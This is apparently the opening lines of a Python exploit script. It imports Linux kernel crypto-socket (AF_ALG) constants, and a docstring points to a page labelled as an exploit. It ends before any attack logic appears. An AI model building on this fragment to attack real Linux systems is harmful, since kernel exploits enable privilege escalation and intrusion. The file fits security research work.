#!/usr/bin/env python3.14
import contextlib
import itertools
import os
import stat
import socket
from socket import AF_ALG, ALG_SET_AEAD_ASSOCLEN, ALG_SET_AEAD_AUTHSIZE, ALG_SET_IV, ALG_SET_OP, MSG_MORE,  SOCK_SEQPACKET,  SOL_ALG

"""
https://copy.fail/#exploit
